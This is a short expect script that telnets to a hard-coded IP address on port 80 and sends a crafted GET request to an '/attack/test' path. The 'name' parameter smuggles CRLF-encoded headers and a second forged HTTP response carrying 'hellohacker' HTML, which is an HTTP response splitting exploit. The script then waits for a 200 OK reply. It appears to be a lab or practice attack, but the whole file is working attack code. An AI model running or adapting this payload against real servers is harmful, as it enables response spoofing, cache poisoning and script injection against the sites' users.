#!/usr/bin/expect -f 

spawn telnet 116.62.64.205 80
expect { 
    "Escape character is '^]'." {
        send "GET /attack/test?name=damon%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>hellohacker</html> HTTP/1.1"
        send "\n"
        send "HOST: 116.62.64.205"
        send "\n\n"
        exp_continue
    }
    -re "HTTP/1.. 200 OK" {
        puts "\n\n"
        exit
    }
}
